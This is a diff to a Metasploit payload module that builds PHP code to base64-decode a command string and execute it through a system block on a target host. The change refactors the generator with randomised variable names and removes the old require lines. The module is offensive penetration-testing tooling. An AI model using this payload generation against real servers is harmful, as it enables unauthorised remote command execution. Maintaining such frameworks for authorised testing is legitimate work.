@@ -3,10 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core/payload/php'
-require 'msf/core/handler/reverse_tcp'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
 module MetasploitModule
 
@@ -38,12 +34,15 @@ module MetasploitModule
   #
   # Constructs the payload
   #
-  def generate
-    buf = "#{php_preamble}"
-    buf += "$c = base64_decode('#{Rex::Text.encode_base64(command_string)}');"
-    buf += "#{php_system_block({:cmd_varname=>"$c"})}"
-    return super + buf
-
+  def generate(_opts = {})
+    vars = Rex::RandomIdentifier::Generator.new
+    dis = "$#{vars[:dis]}"
+    shell = <<-END_OF_PHP_CODE
+              #{php_preamble(disabled_varname: dis)}
+              $c = base64_decode("#{Rex::Text.encode_base64(command_string)}");
+              #{php_system_block(cmd_varname: '$c', disabled_varname: dis)}
+    END_OF_PHP_CODE
+    return super + shell
   end
 
   #
